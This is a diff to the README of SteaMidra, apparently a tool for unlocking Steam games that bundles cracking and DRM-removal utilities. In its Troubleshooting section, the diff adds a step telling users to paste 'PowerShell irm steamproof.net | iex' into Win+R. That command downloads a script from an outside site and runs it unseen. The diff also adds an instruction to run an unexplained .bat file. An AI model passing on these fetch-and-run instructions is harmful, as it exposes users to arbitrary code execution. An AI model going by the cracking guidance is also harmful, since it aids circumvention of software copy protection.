@@ -29,6 +29,8 @@ SteaMidra helps you set up games to work with Steam using Lua scripts, manifests
 ```batch
 pip install -r requirements.txt
 pip install steam==1.4.4 --no-deps
+
+Also run the install_online_fix_requirements.bat
 ```
 
 If you get dependency conflicts with other projects on your system, use a virtual environment:
@@ -38,6 +40,8 @@ python -m venv venv
 venv\Scripts\activate
 pip install -r requirements.txt
 pip install steam==1.4.4 --no-deps
+
+Also run the install_online_fix_requirements.bat
 ```
 
 ### Step 2: Download gbe_fork_tools
@@ -142,9 +146,24 @@ More details in [INSTALL_DEPENDENCIES.md](INSTALL_DEPENDENCIES.md).
 
 ## Troubleshooting
 
-**Dependency conflicts / urllib3 error** – Run both install commands from Step 1 above (requirements.txt first, then `pip install steam==1.4.4 --no-deps`). If conflicts persist with other projects on your system, use a virtual environment.
+**Steam says "No Internet Connection" when downloading** — This is a SteamTools issue where Steam can't reach the manifest endpoint. There are two ways to fix it:
 
-**ModuleNotFoundError** – Dependencies are not installed. Run `pip install -r requirements.txt`.
+1. **Quick permanent fix** — Run this in Win+R:
+   ```
+   PowerShell irm steamproof.net | iex
+   ```
+   Wait for it to finish. After this, Steam downloads will work normally. You can run it again to undo it.
+
+2. **SteaMidra handles it automatically** — When you process a .lua file or use "Update all manifests", manifests are written directly to Steam's `depotcache` folder before Steam starts. Steam finds them locally and never needs to contact the endpoint.
+
+**Dependency conflicts / urllib3 error** — Run both install commands from Step 1 above (requirements.txt first, then `pip install steam==1.4.4 --no-deps`). If conflicts persist with other projects on your system, use a virtual environment.
+
+**ModuleNotFoundError** — Dependencies are not installed. Run `pip install -r requirements.txt`.
+
+**Remove SteamStub (Steamless) → WinError 2** — In the GUI, clicking "Remove SteamStub" now opens a file picker. Just navigate to your game folder and select the `.exe` yourself — no Steam API lookup needed.
+
+**SteamAutoCrack not found** — Make sure the SteaMidra folder is intact and hasn't had any files deleted. SteamAutoCrack is bundled in `third_party/SteamAutoCrack/cli/` and should already be there.
+
 
 ## Credits
 
@@ -164,7 +183,7 @@ More details in [INSTALL_DEPENDENCIES.md](INSTALL_DEPENDENCIES.md).
 
 **fzf** – Used for fuzzy search in menus (CLI). License in `third_party_licenses/fzf.LICENSE`.
 
-**SteamAutoCrack** – The SteamAutoCrack feature uses the **SteamAutoCrack CLI** by oureveryday. Must be placed in `third_party/SteamAutoCrack` by the user. Not shipped with SteaMidra.
+**SteamAutoCrack** – The SteamAutoCrack feature uses the **SteamAutoCrack CLI** by oureveryday. Bundled in `third_party/SteamAutoCrack/cli/`. License in `third_party_licenses/SteamAutoCrack.LICENSE`.
 
 **CreamInstaller** – The DLC Unlockers feature is inspired by and compatible with CreamInstaller. SteaMidra does not ship CreamInstaller; it provides its own implementation that follows similar behavior.
 
